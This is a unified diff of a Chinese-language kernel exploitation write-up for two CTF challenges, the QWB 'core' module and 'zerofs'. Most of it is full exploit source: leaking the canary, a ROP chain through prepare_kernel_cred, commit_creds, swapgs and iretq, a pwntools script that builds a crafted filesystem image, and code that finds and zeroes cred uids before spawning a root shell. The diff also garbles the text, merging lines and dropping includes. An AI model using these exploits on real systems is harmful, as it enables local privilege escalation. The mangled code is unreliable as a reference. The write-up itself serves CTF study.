@@ -76,12 +76,24 @@ ropper --file ./vmlinx --nocolor > gadgets
 
 寻找pop rdi,ret，mov rdi, rax，iret，swapgs等指令，如下：
 
-.text:FFFFFFFF81126515 pop rdi.text:FFFFFFFF81126516 retn
-.text:FFFFFFFF8186EB33 pop rcx.text:FFFFFFFF8186EB34 retn
-.text:FFFFFFFF81623D0B mov rdi, rax.text:FFFFFFFF81623D0E call rcx
-.text:FFFFFFFF810A0F49 pop rdx.text:FFFFFFFF810A0F4A retn
-.text:FFFFFFFF81A012DA swapgs.text:FFFFFFFF81A012DD popfq.text:FFFFFFFF81A012DE retn
-.text:FFFFFFFF81050AC2 iretq
+.text:
+FFFFFFFF81126515 pop rdi.text:
+FFFFFFFF81126516 retn
+.text:
+FFFFFFFF8186EB33 pop rcx.text:
+FFFFFFFF8186EB34 retn
+.text:
+FFFFFFFF81623D0B mov rdi, rax.text:
+FFFFFFFF81623D0E call rcx
+.text:
+FFFFFFFF810A0F49 pop rdx.text:
+FFFFFFFF810A0F4A retn
+.text:
+FFFFFFFF81A012DA swapgs.text:
+FFFFFFFF81A012DD popfq.text:
+FFFFFFFF81A012DE retn
+.text:
+FFFFFFFF81050AC2 iretq
 
 需要构造的rop链为
 
@@ -185,7 +197,22 @@ struct cred { atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscriber
 
 gef➤ x /80wx $rsi0xffff95713f8a9300: 0xffffffff 0x0000003f 0x000003e8 0x000000030xffff95713f8a9310: 0x00000000 0x00000000 0x3faa1080 0xffff95710xffff95713f8a9320: 0x000003e8 0x000003e8 0x00000000 0x000000000xffff95713f8a9330: 0x00000000 0x00000000 0x000003e8 0x000000000xffff95713f8a9340: 0x00000000 0x00000000 0x00000000 0x000000000xffff95713f8a9350: 0x3f813630 0xffff9571 0x00000000 0x000000000xffff95713f8a9360: 0x00000000 0x00000000 0x000003e8 0x000003e80xffff95713f8a9370: 0x00000000 0x00000000 0x00000000 0x000000000xffff95713f8a9380: 0xb2c50660 0xffffffff 0x00000000 0x000000000xffff95713f8a9390: 0x000003e8 0x00000000 0x00000000 0x000000000xffff95713f8a93a0: 0x00000000 0x000003e8 0x00000000 0x000000000xffff95713f8a93b0: 0x00000025 0x80000000 0x00000000 0x00000000
 
-.text:FFFFFFFF81094970 sub_FFFFFFFF81094970 proc near ; CODE XREF: sub_FFFFFFFF81003960+54↑p.text:FFFFFFFF81094970 ; sub_FFFFFFFF81003A25+4B↑p ....text:FFFFFFFF81094970 call nullsub_1.text:FFFFFFFF81094975 push rbp.text:FFFFFFFF81094976 mov rax, gs:off_D300.text:FFFFFFFF8109497F mov rax, [rax+0B38h].text:FFFFFFFF81094986 mov rbp, rsp.text:FFFFFFFF81094989 mov esi, [rax+6Ch]//gid.text:FFFFFFFF8109498C mov rdi, [rax+80h].text:FFFFFFFF81094993 call sub_FFFFFFFF8112A300.text:FFFFFFFF81094998 pop rbp.text:FFFFFFFF81094999 mov eax, eax.text:FFFFFFFF8109499B retn.text:FFFFFFFF8109499B sub_FFFFFFFF81094970 endp
+.text:
+FFFFFFFF81094970 sub_FFFFFFFF81094970 proc near ; CODE XREF: sub_FFFFFFFF81003960+54↑p.text:
+FFFFFFFF81094970 ; sub_FFFFFFFF81003A25+4B↑p ....text:
+FFFFFFFF81094970 call nullsub_1.text:
+FFFFFFFF81094975 push rbp.text:
+FFFFFFFF81094976 mov rax, gs:
+off_D300.text:
+FFFFFFFF8109497F mov rax, [rax+0B38h].text:
+FFFFFFFF81094986 mov rbp, rsp.text:
+FFFFFFFF81094989 mov esi, [rax+6Ch]//gid.text:
+FFFFFFFF8109498C mov rdi, [rax+80h].text:
+FFFFFFFF81094993 call sub_FFFFFFFF8112A300.text:
+FFFFFFFF81094998 pop rbp.text:
+FFFFFFFF81094999 mov eax, eax.text:
+FFFFFFFF8109499B retn.text:
+FFFFFFFF8109499B sub_FFFFFFFF81094970 endp
 
 创建zerofs文件系统的脚本如下：
 
@@ -193,7 +220,8 @@ from pwn import *zerofs_block0 = p64(0x4F52455A)+p64(0x1000)+p64(0x3)+p64(0)zero
 
 exp如下：
 
-#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <assert.h>#include <sys/mman.h>int current_uid = 0x3e8;int search_modify(int* buf){ for(int i=0;i<0x10000/4-12;i++) { if(buf[i]==current_uid && buf[i+6]==current_uid&& buf[i+7]==current_uid &&buf[i+12]==current_uid && buf[i+24]==current_uid && buf[i+25]==current_uid&& buf[i+34]==current_uid && buf[i+39]==current_uid) { printf("find credn); buf[i]=0; buf[i+6]=0; buf[i+7]=0; buf[i+12]=0; buf[i+24]=0; buf[i+25]=0; buf[i+34]=0; buf[i+39]=0; return 1; } } return 0;}int main(int argc,char*argv[]){ int fd1 = open("/mnt/test",O_RDWR); if(fd1==-1) { printf("fd is -1n"); exit(0); } printf("fd is %dn",fd1); int buflen=0x10000; int buf[0x10000/4]={0}; int idx=0; int beginidx; printf("begin searchn"); if(argc>=2) idx=strtol(argv[1],NULL,10); beginidx=idx; for (idx;idx<=beginidx+0x10000;idx++) { lseek(fd1,idx*buflen,SEEK_SET); read(fd1,buf,buflen); if(search_modify(buf)) { printf("final idx is %dn",idx); lseek(fd1,idx*buflen,SEEK_SET); write(fd1,buf,buflen); if(getuid()!=0) { printf("current uid is %dn",getuid()); exit(0); } else{ system("/bin/sh"); return 0; } } } return 0;}
+#include <stdio.h>#include <stdlib.h>#include #include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <assert.h>#include <sys/mman.h>int current_uid = 0x3e8;
+int search_modify(int* buf){ for(int i=0;i<0x10000/4-12;i++) { if(buf[i]==current_uid && buf[i+6]==current_uid&& buf[i+7]==current_uid &&buf[i+12]==current_uid && buf[i+24]==current_uid && buf[i+25]==current_uid&& buf[i+34]==current_uid && buf[i+39]==current_uid) { printf("find credn); buf[i]=0; buf[i+6]=0; buf[i+7]=0; buf[i+12]=0; buf[i+24]=0; buf[i+25]=0; buf[i+34]=0; buf[i+39]=0; return 1; } } return 0;}int main(int argc,char*argv[]){ int fd1 = open("/mnt/test",O_RDWR); if(fd1==-1) { printf("fd is -1n"); exit(0); } printf("fd is %dn",fd1); int buflen=0x10000; int buf[0x10000/4]={0}; int idx=0; int beginidx; printf("begin searchn"); if(argc>=2) idx=strtol(argv[1],NULL,10); beginidx=idx; for (idx;idx<=beginidx+0x10000;idx++) { lseek(fd1,idx*buflen,SEEK_SET); read(fd1,buf,buflen); if(search_modify(buf)) { printf("final idx is %dn",idx); lseek(fd1,idx*buflen,SEEK_SET); write(fd1,buf,buflen); if(getuid()!=0) { printf("current uid is %dn",getuid()); exit(0); } else{ system("/bin/sh"); return 0; } } } return 0;}
 
 提权结果如下：
 
@@ -216,127 +244,49 @@ reference:
 
 ```
 #!/bin/shmount -t proc proc /procmount -t sysfs sysfs /sysmount -t devtmpfs none /dev/sbin/mdev -smkdir -p /dev/ptsmount -vt devpts -o gid=4,mode=620 none /dev/ptschmod 666 /dev/ptmxcat /proc/kallsyms > /tmp/kallsymsecho 1 > /proc/sys/kernel/kptr_restrictecho 1 > /proc/sys/kernel/dmesg_restrictifconfig eth0 upudhcpc -i eth0ifconfig eth0 10.0.2.15 netmask 255.255.255.0route add default gw 10.0.2.2insmod /core.kosetsid /bin/cttyhack setuidgid 1000 /bin/shecho 'sh end!n'umount /procumount /sys
-```
-
-
-
-```
 gdb-peda$ checksecCANARY : ENABLEDFORTIFY : disabledNX : ENABLEDPIE : disabledRELRO : disabled
-```
-
-
-
-```
 undefined8 init_module(void){ core_proc = proc_create(&DAT_001002fd,0x1b6,0,core_fops); printk(&DAT_00100302); return 0;}
-```
-
-
-
-```
 undefined8 core_ioctl(undefined8 param_1,int param_2,ulong param_3){ if (param_2 == 0x6677889b) { core_read(param_3); } else { if (param_2 == 0x6677889c) { printk(&DAT_001002f1,param_3); off = param_3; } else { if (param_2 == 0x6677889a) { printk(&DAT_001002d7); core_copy_func(param_3); } } } return 0;}
-```
-
-
-
-```
 void core_read(undefined8 param_1)
 { long lVar1; undefined4 *puVar2; long in_GS_OFFSET; byte bVar3; undefined4 auStack80 [16]; long local_10; bVar3 = 0; local_10 = *(long *)(in_GS_OFFSET + 0x28); printk(&DAT_0010027f); printk(&DAT_00100299,off,param_1); lVar1 = 0x10; puVar2 = auStack80; while (lVar1 != 0) { lVar1 = lVar1 + -1; *puVar2 = 0; puVar2 = puVar2 + (ulong)bVar3 * -2 + 1; } strcpy((char *)auStack80,"Welcome to the QWB CTF challenge.n"); lVar1 = _copy_to_user(param_1,(long)auStack80 + off,0x40);//全局变量off可控 if (lVar1 != 0) { swapgs(); return; } if (local_10 != *(long *)(in_GS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return;}
-```
-
-
-
-```
-#include <stdio.h>#include <stdlib.h>#include <sys/stat.h>#include <fcntl.h>int main(int argc,char* argv[]){ int fd1 = open("/proc/core",O_RDWR); unsigned long long buf[0x1000]; memset(buf,'a',0x200); int off=0; if(argc>1) { off=strtol(argv[1],NULL,10); } printf("fd is %dn",fd1); ioctl(fd1,0x6677889C,off); ioctl(fd1,0x6677889B,buf); for(int i =0;i<4;i++) { for(int m=0;m<4;m++) { printf("%016llx ",buf[i*4+m]); } printf("n"); } return 0;
+    #include <stdio.h>#include <stdlib.h>#include <sys/stat.h>#include <fcntl.h>int main(int argc,char* argv[]){ int fd1 = open("/proc/core",O_RDWR); unsigned long long buf[0x1000]; memset(buf,'a',0x200); int off=0; if(argc>1) { off=strtol(argv[1],NULL,10); } printf("fd is %dn",fd1); ioctl(fd1,0x6677889C,off); ioctl(fd1,0x6677889B,buf); for(int i =0;i<4;i++) { for(int m=0;m<4;m++) { printf("%016llx ",buf[i*4+m]); } printf("n"); } return 0;
 }
-```
-
-
-
-```
 / $ ./poc 64fd is 35d2043a60145af00 00007ffe2b41ecf0 ffffffffc03cc19b ffff96afda3efe40 ffffffffa19dd6d1 000000000000889b ffff96afdf80fb00 ffffffffa198ecfa 6161616161616161 6161616161616161 6161616161616161 6161616161616161
-```
-
-
-
-```
 undefined [16] core_write(undefined8 param_1,undefined8 param_2,ulong param_3){ ulong uVar1; long lVar2; printk(&DAT_00100239); if (param_3 < 0x801) { lVar2 = _copy_from_user(name,param_2,param_3); if (lVar2 == 0) { uVar1 = param_3 & 0xffffffff; goto LAB_00100084; } } printk(&DAT_00100254); uVar1 = 0xfffffff2;LAB_00100084: return CONCAT88(param_2,uVar1);}
-```
-
-
-
-```
 undefined8 core_copy_func(ulong param_1){ undefined8 uVar1; ulong uVar2; undefined1 *puVar3; undefined *puVar4; long in_GS_OFFSET; byte bVar5; undefined auStack80 [64]; long local_10; bVar5 = 0; local_10 = *(long *)(in_GS_OFFSET + 0x28); printk(&DAT_00100239); if ((long)param_1 < 0x40) { uVar2 = param_1 & 0xffff; uVar1 = 0; puVar3 = name; puVar4 = auStack80; while (uVar2 != 0) { uVar2 = uVar2 - 1; *puVar4 = *puVar3; puVar3 = puVar3 + (ulong)bVar5 * -2 + 1; puVar4 = puVar4 + (ulong)bVar5 * -2 + 1; } } else { printk(&DAT_001002c5); uVar1 = 0xffffffff; } if (local_10 == *(long *)(in_GS_OFFSET + 0x28)) { return uVar1; } /* WARNING: Subroutine does not return */ __stack_chk_fail();}
-```
-
-
-
-```
-#include <stdio.h>#include <stdlib.h>#include <sys/stat.h>#include <fcntl.h>typedef unsigned long long u64;u64 prepare_kernel_cred;u64 commit_creds;u64 ret_addr;u64 readkerneladdr(char* command){ FILE *fp; u64 kaddr; char buffer[80]; char* retbuf; fp=popen(command, "r"); fgets(buffer,sizeof(buffer),fp); retbuf = strstr(buffer," "); int addrlen = retbuf-buffer; memset(buffer+addrlen,0,10); kaddr = strtoul(buffer,NULL,16); return kaddr;}void poc1_shellcode(){ int*(*userPrepare_kernel_cred)(int) = prepare_kernel_cred; void*(*userCommit_cred)(int*) = commit_creds; (*userCommit_cred)((*userPrepare_kernel_cred)(0)); asm("mov %rbp,%rsp"); //修复栈帧 asm("pop %rbp"); asm("mov %0,%%rax; //跳转回内核函数地址 jmp %%rax;" : :"r"(ret_addr) :"%rax");}
+    #include <stdio.h>#include <stdlib.h>#include <sys/stat.h>#include <fcntl.h>typedef unsigned long long u64;u64 prepare_kernel_cred;u64 commit_creds;u64 ret_addr;u64 readkerneladdr(char* command){ FILE *fp; u64 kaddr; char buffer[80]; char* retbuf; fp=popen(command, "r"); fgets(buffer,sizeof(buffer),fp); retbuf = strstr(buffer," "); int addrlen = retbuf-buffer; memset(buffer+addrlen,0,10); kaddr = strtoul(buffer,NULL,16); return kaddr;}void poc1_shellcode(){ int*(*userPrepare_kernel_cred)(int) = prepare_kernel_cred; void*(*userCommit_cred)(int*) = commit_creds; (*userCommit_cred)((*userPrepare_kernel_cred)(0)); asm("mov %rbp,%rsp"); //修复栈帧 asm("pop %rbp"); asm("mov %0,%%rax; //跳转回内核函数地址 jmp %%rax;" : :"r"(ret_addr) :"%rax");}
 int main(int argc,char* argv[]){ int fd1 = open("/proc/core",O_RDWR); prepare_kernel_cred = readkerneladdr("cat /tmp/kallsyms|grep prepare_kernel_cred"); commit_creds = readkerneladdr("cat /tmp/kallsyms|grep commit_creds"); u64 buf[0x1000]; memset(buf,'a',0x200); int off=64; if(argc>1) { off=strtol(argv[1],NULL,10); } printf("fd is %dn",fd1); ioctl(fd1,0x6677889C,off); ioctl(fd1,0x6677889B,buf); u64 canary = buf[0]; ret_addr = buf[2]; u64 poc[0x100]={ 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,canary,0,&poc1_shellcode }; write(fd1,poc,0x100); ioctl(fd1,0x6677889A,0xf000000000000058); system("/bin/sh"); return 0;}
-```
-
-
-
-```
 extract-vmlinux ./bzImage > vmlinux
-```
-
-
-
-```
 ropper --file ./vmlinx --nocolor > gadgets
-```
-
-
-
-```
-.text:FFFFFFFF81126515 pop rdi.text:FFFFFFFF81126516 retn
-.text:FFFFFFFF8186EB33 pop rcx.text:FFFFFFFF8186EB34 retn
-.text:FFFFFFFF81623D0B mov rdi, rax.text:FFFFFFFF81623D0E call rcx
-.text:FFFFFFFF810A0F49 pop rdx.text:FFFFFFFF810A0F4A retn
-.text:FFFFFFFF81A012DA swapgs.text:FFFFFFFF81A012DD popfq.text:FFFFFFFF81A012DE retn
-.text:FFFFFFFF81050AC2 iretq
-```
-
-
-
-```
+.text:
+FFFFFFFF81126515 pop rdi.text:
+FFFFFFFF81126516 retn
+.text:
+FFFFFFFF8186EB33 pop rcx.text:
+FFFFFFFF8186EB34 retn
+.text:
+FFFFFFFF81623D0B mov rdi, rax.text:
+FFFFFFFF81623D0E call rcx
+.text:
+FFFFFFFF810A0F49 pop rdx.text:
+FFFFFFFF810A0F4A retn
+.text:
+FFFFFFFF81A012DA swapgs.text:
+FFFFFFFF81A012DD popfq.text:
+FFFFFFFF81A012DE retn
+.text:
+FFFFFFFF81050AC2 iretq
 执行prepare_kernel_cred(0)
 将prepare_kernel_cred的执行结果赋值给rdi
 执行commit_creds
 执行swapgs
 执行iret
-```
-
-
-
-```
-#include <stdio.h>#include <stdlib.h>#include <sys/stat.h>#include <fcntl.h>typedef unsigned long long u64;u64 prepare_kernel_cred;u64 commit_creds;u64 ret_addr;u64 user_cs,user_rflags,user_ss,user_sp;u64 readkerneladdr(char* command){ FILE *fp; u64 kaddr; char buffer[80]; char* retbuf; fp=popen(command, "r"); fgets(buffer,sizeof(buffer),fp); retbuf = strstr(buffer," "); int addrlen = retbuf-buffer; memset(buffer+addrlen,0,10); kaddr = strtoul(buffer,NULL,16); return kaddr;}void execshell(){ system("/bin/sh");}void save_status(){ __asm__("mov user_cs, cs;" "mov user_ss, ss;" "mov user_sp, rsp;" "pushf;" "pop user_rflags;" );}int main(int argc,char* argv[]){
+    #include <stdio.h>#include <stdlib.h>#include <sys/stat.h>#include <fcntl.h>typedef unsigned long long u64;u64 prepare_kernel_cred;u64 commit_creds;u64 ret_addr;u64 user_cs,user_rflags,user_ss,user_sp;u64 readkerneladdr(char* command){ FILE *fp; u64 kaddr; char buffer[80]; char* retbuf; fp=popen(command, "r"); fgets(buffer,sizeof(buffer),fp); retbuf = strstr(buffer," "); int addrlen = retbuf-buffer; memset(buffer+addrlen,0,10); kaddr = strtoul(buffer,NULL,16); return kaddr;}void execshell(){ system("/bin/sh");}void save_status(){ __asm__("mov user_cs, cs;" "mov user_ss, ss;" "mov user_sp, rsp;" "pushf;" "pop user_rflags;" );}int main(int argc,char* argv[]){
  int fd1 = open("/proc/core",O_RDWR); prepare_kernel_cred = readkerneladdr("cat /tmp/kallsyms|grep prepare_kernel_cred"); commit_creds = readkerneladdr("cat /tmp/kallsyms|grep commit_creds"); u64 buf[0x1000]; memset(buf,'a',0x200); int off=64; if(argc>1) { off=strtol(argv[1],NULL,10); } printf("fd is %dn",fd1); ioctl(fd1,0x6677889C,off); ioctl(fd1,0x6677889B,buf); u64 canary = buf[0]; ret_addr = buf[2]; u64 kernelbase = prepare_kernel_cred-0x9cce0; u64 kerneloff =0xFFFFFFFF81000000- kernelbase; save_status(); u64 Rop[0x100]={0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,canary,0, 0xFFFFFFFF81126515-kerneloff, //pop rdi,ret 0, prepare_kernel_cred, 0xFFFFFFFF8186EB33-kerneloff, //pop rcx,ret 0xFFFFFFFF810A0F49-kerneloff, //pop rdx,ret 0xFFFFFFFF81623D0B-kerneloff, //mov rdi,rax,call rcx commit_creds, 0xffffffff81a012da-kerneloff, //swapgs,popfq,ret 0, 0xFFFFFFFF81050AC2-kerneloff, //iret &execshell, //ret ip user_cs, user_rflags, user_sp, user_ss };
  write(fd1,Rop,0x100); ioctl(fd1,0x6677889a,0xf0000000000000e0); return 0;}
-```
-
-
-
-```
 qemu-system-x86_64 -m 512M -kernel ./bzImage -initrd ./core.cpio -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" -s -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 -nographic -cpu qemu64,+smep,+smap
-```
-
-
-
-```
 admins@admins-virtual-machine:~/kernel/exercise/zerofs/public$ ls -alhtotal 11Mdrwxrwxr-x 2 admins admins 4.0K 12月 22 17:21 .drwxrwxr-x 5 admins admins 4.0K 12月 22 17:22 ..-rw-r--r-- 1 admins admins 6.9M 3月 29 2018 bzImage-rw-rw-r-- 1 admins admins 3.1M 3月 30 2018 rootfs.cpio-rwxrwxr-x 1 admins admins 241 12月 22 17:21 run.sh-rw-r--r-- 1 admins admins 320K 3月 29 2018 zerofs.ko
-```
-
-
-
-```
 qemu-system-x86_64 -enable-kvm -s -cpu kvm64,+smep,+smap -m 512M -kernel ./bzImage -initrd ./rootfs.cpio -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" -monitor /dev/null -nographic 2>/dev/null
-```
-
-
-
-```
 #!/bin/sh
 mknod -m 0666 /dev/null c 1 3mknod -m 0660 /dev/ttyS0 c 4 64
 mount -t proc proc /procmount -t sysfs sysfs /sys
@@ -345,81 +295,37 @@ echo 2 > /proc/sys/kernel/kptr_restrictecho 1 > /proc/sys/kernel/dmesg_restrict
 insmod /zerofs.ko
 setsid cttyhack setuidgid 1000 shumount /procumount /sys
 poweroff -f
-```
-
-
-
-```
 undefined8 main(void){ undefined8 local_10; setresuid(0,0,0); local_4c = fork(); if (local_4c == 0) { local_48 = "mount"; local_40 = "-o"; local_38 = "loop"; local_30 = "-t"; local_28 = "zerofs"; local_20 = "/tmp/zerofs.img"; local_18 = "/mnt"; local_10 = 0; execvp("/bin/mount",&local_48); } waitpid(local_4c,&local_50,0); local_4c = fork(); if (local_4c == 0) { local_48 = "chown"; local_40 = "-R"; local_38 = "1000.1000"; local_30 = "/mnt"; local_28 = (char *)0x0; execvp("/bin/chown",&local_48); } waitpid(local_4c,&local_50,0); local_4c = fork(); if (local_4c == 0) { local_48 = "chmod"; local_40 = "-R"; local_38 = "a+rwx"; local_30 = "/mnt"; local_28 = (char *)0x0; execvp("/bin/chmod",&local_48); } waitpid(local_4c,&local_50,0); return 0;}
-```
-
-
-
-```
 int zerofs_init(void){ int iVar1;
  __fentry__(); zerofs_inode_cachep = (kmem_cache *)kmem_cache_create("zerofs_inode_cache",0x20,0,0x120000,0); if (zerofs_inode_cachep != (kmem_cache *)0x0) { iVar1 = register_filesystem(&zerofs_type); //注册文件系统 return iVar1; } return -0xc;}
-```
-
-
-
-```
 struct file_system_type { const char *name; int fs_flags; struct dentry *(*mount) (struct file_system_type *, int, const char *, void *); void (*kill_sb) (struct super_block *); struct module *owner; struct file_system_type * next; ...}
-```
-
-
-
-```
 dentry * zerofs_mount(file_system_type *fs_type,int flags,char *dev_name,void *data){ dentry *extraout_RAX; undefined extraout_DL; undefined uVar1; uVar1 = SUB81(fs_type,0); __fentry__(uVar1,flags,(char)dev_name); mount_bdev(uVar1,(char)flags,extraout_DL,zerofs_fill_super); return extraout_RAX;}
-```
-
-
-
-```
 if (s->s_root) { if ((flags ^ s->s_flags) & SB_RDONLY) { deactivate_locked_super(s); error = -EBUSY; goto error_bdev; } up_write(&s->s_umount); blkdev_put(bdev, mode); down_write(&s->s_umount); } else { s->s_mode = mode; snprintf(s->s_id, sizeof(s->s_id), "%pg", bdev); sb_set_blocksize(s, block_size(bdev)); error = fill_super(s, data, flags & SB_SILENT ? 1 : 0); //调用对应内核函数进行超级块的填充 if (error) { deactivate_locked_super(s); goto error; }
  s->s_flags |= SB_ACTIVE; bdev->bd_super = s; }
-```
-
-
-
-```
 int zerofs_fill_super(super_block *sb,void *data,int silent){ astruct *superblock; long lVar1; undefined8 uVar2; zerofs_inode *pzVar3; list_head *plVar4; undefined4 in_register_00000014; undefined8 uVar5; uint uVar6; undefined auVar7 [16]; xattr_handler **userdata;
  __fentry__(sb,data,CONCAT44(in_register_00000014,silent)); /* 获取第一块数据作为超级块结构 */ superblock = (astruct *) __bread_gfp((sb->s_writers).rw_sem[2].writer.task,0,*(undefined4 *)&sb->field_0x578,8 ); if (superblock != (astruct *)0x0) { userdata = superblock->data; /* 判断超级块的前24字节是否符合zerofs定义 */ if (((*userdata == (xattr_handler *)0x4f52455a) && (userdata[1] == (xattr_handler *)0x1000)) && (userdata[2] < (xattr_handler *)0x41)) { /* sb->s_magic */ (sb->s_writers).rw_sem[2].rw_sem.wait_list.prev = (list_head *)0x4f52455a; /* sb->s_fsinfo */ sb->s_xattr = userdata; /* sb->s_maxbytes */ (sb->rcu).next = (callback_head *)0x1000; /* sb->s_op */ sb->s_cop = (fscrypt_operations *)&zerofs_sops; lVar1 = new_inode(sb); *(undefined8 *)(lVar1 + 400) = 1; inode_init_owner(lVar1,0,0x4000); *(super_block **)(lVar1 + 600) = sb; *(inode_operations **)(lVar1 + 0x118) = &zerofs_inode_ops; *(file_operations **)(lVar1 + 0x30) = &zerofs_dir_ops; auVar7 = current_time(lVar1); uVar5 = SUB168(auVar7 >> 0x40,0); uVar2 = SUB168(auVar7,0); *(undefined8 *)(lVar1 + 0x148) = uVar5; *(undefined8 *)(lVar1 + 0x18) = uVar5; *(undefined8 *)(lVar1 + 0xa8) = uVar5; *(undefined8 *)(lVar1 + 0x140) = uVar2; *(undefined8 *)(lVar1 + 0x10) = uVar2; *(undefined8 *)(lVar1 + 0xa0) = uVar2; pzVar3 = zerofs_get_inode(sb,1); *(zerofs_inode **)(lVar1 + 0x168) = pzVar3; plVar4 = (list_head *)d_make_root(lVar1); (sb->s_writers).rw_sem[2].rw_sem.wait_list.next = plVar4; uVar6 = -(uint)(plVar4 == (list_head *)0x0) & 0xfffffff4; } else { uVar6 = 0xffffffea; } __brelse(superblock); return (int)uVar6; } do { invalidInstructionException(); } while( true );}
-```
-
-
-
-```
 struct inode{ int inode_number; int block_number; int mode; union { uint64_t file_size; uint64_t dir_children_count; };}
-```
-
-
-
-```
 struct cred { atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security managemen
-```
-
-
-
-```
 gef➤ x /80wx $rsi0xffff95713f8a9300: 0xffffffff 0x0000003f 0x000003e8 0x000000030xffff95713f8a9310: 0x00000000 0x00000000 0x3faa1080 0xffff95710xffff95713f8a9320: 0x000003e8 0x000003e8 0x00000000 0x000000000xffff95713f8a9330: 0x00000000 0x00000000 0x000003e8 0x000000000xffff95713f8a9340: 0x00000000 0x00000000 0x00000000 0x000000000xffff95713f8a9350: 0x3f813630 0xffff9571 0x00000000 0x000000000xffff95713f8a9360: 0x00000000 0x00000000 0x000003e8 0x000003e80xffff95713f8a9370: 0x00000000 0x00000000 0x00000000 0x000000000xffff95713f8a9380: 0xb2c50660 0xffffffff 0x00000000 0x000000000xffff95713f8a9390: 0x000003e8 0x00000000 0x00000000 0x000000000xffff95713f8a93a0: 0x00000000 0x000003e8 0x00000000 0x000000000xffff95713f8a93b0: 0x00000025 0x80000000 0x00000000 0x00000000
-```
-
-
-
-```
-.text:FFFFFFFF81094970 sub_FFFFFFFF81094970 proc near ; CODE XREF: sub_FFFFFFFF81003960+54↑p.text:FFFFFFFF81094970 ; sub_FFFFFFFF81003A25+4B↑p ....text:FFFFFFFF81094970 call nullsub_1.text:FFFFFFFF81094975 push rbp.text:FFFFFFFF81094976 mov rax, gs:off_D300.text:FFFFFFFF8109497F mov rax, [rax+0B38h].text:FFFFFFFF81094986 mov rbp, rsp.text:FFFFFFFF81094989 mov esi, [rax+6Ch]//gid.text:FFFFFFFF8109498C mov rdi, [rax+80h].text:FFFFFFFF81094993 call sub_FFFFFFFF8112A300.text:FFFFFFFF81094998 pop rbp.text:FFFFFFFF81094999 mov eax, eax.text:FFFFFFFF8109499B retn.text:FFFFFFFF8109499B sub_FFFFFFFF81094970 endp
-```
-
-
-
-```
+.text:
+FFFFFFFF81094970 sub_FFFFFFFF81094970 proc near ; CODE XREF: sub_FFFFFFFF81003960+54↑p.text:
+FFFFFFFF81094970 ; sub_FFFFFFFF81003A25+4B↑p ....text:
+FFFFFFFF81094970 call nullsub_1.text:
+FFFFFFFF81094975 push rbp.text:
+FFFFFFFF81094976 mov rax, gs:
+off_D300.text:
+FFFFFFFF8109497F mov rax, [rax+0B38h].text:
+FFFFFFFF81094986 mov rbp, rsp.text:
+FFFFFFFF81094989 mov esi, [rax+6Ch]//gid.text:
+FFFFFFFF8109498C mov rdi, [rax+80h].text:
+FFFFFFFF81094993 call sub_FFFFFFFF8112A300.text:
+FFFFFFFF81094998 pop rbp.text:
+FFFFFFFF81094999 mov eax, eax.text:
+FFFFFFFF8109499B retn.text:
+FFFFFFFF8109499B sub_FFFFFFFF81094970 endp
 from pwn import *zerofs_block0 = p64(0x4F52455A)+p64(0x1000)+p64(0x3)+p64(0)zerofs_block0 = zerofs_block0.ljust(0x1000,b"x00")inode_block1 = p64(0x1)+p64(0x2)+p64(0x4000)+p64(1)inode_block1 +=p64(0x2)+p64(0x3)+p64(0x8000)+p64(0xffffffffffffffff)inode_block1 = inode_block1.ljust(0x1000,b"x00")zerofs_block2 = b"test".ljust(256,b"x00")zerofs_block2 += p64(2)zerofs_block2 = zerofs_block2.ljust(0x1000,b"x00")zerofs_block3 = b"a"*0x1000block = zerofs_block0+inode_block1+zerofs_block2+zerofs_block3fimage = open("./tmp/zerofs.img","wb")fimage.write(block)fimage.close()
-```
-
-
-
-```
-#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <assert.h>#include <sys/mman.h>int current_uid = 0x3e8;int search_modify(int* buf){ for(int i=0;i<0x10000/4-12;i++) { if(buf[i]==current_uid && buf[i+6]==current_uid&& buf[i+7]==current_uid &&buf[i+12]==current_uid && buf[i+24]==current_uid && buf[i+25]==current_uid&& buf[i+34]==current_uid && buf[i+39]==current_uid) { printf("find credn); buf[i]=0; buf[i+6]=0; buf[i+7]=0; buf[i+12]=0; buf[i+24]=0; buf[i+25]=0; buf[i+34]=0; buf[i+39]=0; return 1; } } return 0;}int main(int argc,char*argv[]){ int fd1 = open("/mnt/test",O_RDWR); if(fd1==-1) { printf("fd is -1n"); exit(0); } printf("fd is %dn",fd1); int buflen=0x10000; int buf[0x10000/4]={0}; int idx=0; int beginidx; printf("begin searchn"); if(argc>=2) idx=strtol(argv[1],NULL,10); beginidx=idx; for (idx;idx<=beginidx+0x10000;idx++) { lseek(fd1,idx*buflen,SEEK_SET); read(fd1,buf,buflen); if(search_modify(buf)) { printf("final idx is %dn",idx); lseek(fd1,idx*buflen,SEEK_SET); write(fd1,buf,buflen); if(getuid()!=0) { printf("current uid is %dn",getuid()); exit(0); } else{ system("/bin/sh"); return 0; } } } return 0;}
+    #include <stdio.h>#include <stdlib.h>#include #include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <assert.h>#include <sys/mman.h>int current_uid = 0x3e8;
